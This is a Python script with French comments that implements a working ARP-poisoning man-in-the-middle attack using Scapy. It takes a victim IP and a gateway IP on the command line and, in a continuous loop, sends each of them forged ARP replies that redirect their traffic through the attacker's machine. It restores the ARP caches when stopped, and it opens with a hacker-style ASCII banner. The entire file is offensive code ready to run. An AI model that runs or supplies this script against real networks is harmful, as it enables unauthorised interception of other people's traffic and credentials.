

import scapy.all as scapy
import time
import optparse
import sys
import logging

# On coupe les warnings relous de Scapy 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"

def main():
    # Bannière stylée
    print(RED + """
 ▄▄▄          ██▓   ▓█████▄     ▄▄▄          ███▄    █ 
▒████▄       ▓██▒   ▒██▀ ██▌   ▒████▄        ██ ▀█   █ 
▒██  ▀█▄     ▒██▒   ░██   █▌   ▒██  ▀█▄     ▓██  ▀█ ██▒
░██▄▄▄▄██    ░██░   ░▓█▄   ▌   ░██▄▄▄▄██    ▓██▒  ▐▌██▒
 ▓█   ▓██▒   ░██░   ░▒████▓     ▓█   ▓██▒   ▒██░   ▓██░
 ▒▒   ▓▒█░   ░▓      ▒▒▓  ▒     ▒▒   ▓▒█░   ░ ▒░   ▒ ▒ 
  ▒   ▒▒ ░    ▒ ░    ░ ▒  ▒      ▒   ▒▒ ░   ░ ░░   ░ ▒░
  ░   ▒       ▒ ░    ░ ░  ░      ░   ▒         ░   ░ ░ 
      ░  ░    ░        ░             ░  ░            ░ 
                     ░                                     
""" + RESET)

main()



def get_mac(ip):
    """
    Envoie une requête ARP pour récupérer l'adresse MAC d'une IP donnée.
    """
    # On crée une requête ARP : "Qui a l'IP X ?"
    arp_request = scapy.ARP(pdst=ip)
    # On crée une trame Ethernet pour envoyer la requête à TOUT le réseau (broadcast)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # On assemble les deux couches
    packet = broadcast / arp_request
    
    # On envoie (srp = Send/Receive Packets layer 2)
    # timeout=2 pour ne pas attendre indéfiniment
    answered_list = scapy.srp(packet, timeout=2, verbose=False)[0]
    
    # Si on a une réponse, on extrait la MAC de l'émetteur (hwsrc)
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        # Si get_mac échoue, le MITM est impossible, donc on arrête tout
        print(f"\n[-] Impossible de trouver la MAC pour {ip}. Vérifie la connexion.")
        sys.exit()

def spoof(target_ip, spoof_ip, target_mac):
    """
    Envoie un faux paquet ARP (ARP Poisoning).
    On dit à target_ip que l'IP spoof_ip se trouve à NOTRE adresse MAC.
    """
    # Ether(dst=target_mac) : On définit l'enveloppe pour qu'elle aille direct à la cible (évite les warnings)
    # op=2 : On envoie une "réponse" ARP (Is-at) même si personne n'a rien demandé
    # psrc : L'IP qu'on usurpe (ex: l'IP de la box pour la victime)
    # hwdst : La MAC de la cible pour que le paquet arrive au bon endroit
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # On utilise sendp car on travaille en couche 2 (Ethernet)
    scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    """
    Remet le réseau en état en envoyant les VRAIES infos ARP.
    """
    # Ici on précise bien 'hwsrc=source_mac' pour redonner la vraie identité
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # On envoie 4 fois pour être sûr que la table ARP se mette bien à jour
    scapy.sendp(packet, count=4, verbose=False)

# --- GESTION DES ARGUMENTS ---
parser = optparse.OptionParser()
parser.add_option("-v", "--victim", dest="victim", help="IP de la cible à hacker")
parser.add_option("-g", "--gateway", dest="gateway", help="IP du routeur (la box)")
(options, arguments) = parser.parse_args()

if not options.victim or not options.gateway:
    print("[-] Erreur : Utilise --help pour voir la syntaxe.")
    sys.exit()

try:
    # Etape 1 : Récupérer les MAC réelles pour pouvoir envoyer les paquets
    print("[*] Initialisation... Récupération des adresses MAC.")
    target_mac = get_mac(options.victim)
    gateway_mac = get_mac(options.gateway)
    
    print(f"[+] Victime : {options.victim} est à {target_mac}"

)
    print(f"[+] Passerelle : {options.gateway} est à {gateway_mac}")

    packet_count = 0
    print("[*] Attaque lancée. Appuie sur Ctrl+C pour arrêter.")

    # Etape 2 : Boucle d'empoisonnement
    while True:
        # On dit à la victime : "Je suis la box"
        spoof(options.victim, options.gateway, target_mac)
        # On dit à la box : "Je suis la victime"
        spoof(options.gateway, options.victim, gateway_mac)
        
        packet_count += 2
        # Le \r permet d'effacer la ligne précédente pour faire un compteur propre
        print(f"\r[+] Paquets envoyés : {packet_count}", end="")
        time.sleep(2)

except KeyboardInterrupt:
    # Etape 3 : Nettoyage en cas d'arrêt (sinon plus personne n'a internet)
    print("\n[*] Arrêt détecté... Restauration du cache ARP en cours.")
    restore(options.victim, options.gateway, target_mac, gateway_mac)
    restore(options.gateway, options.victim, gateway_mac, target_mac)
    print("[+] Réseau rétabli. À plus !")
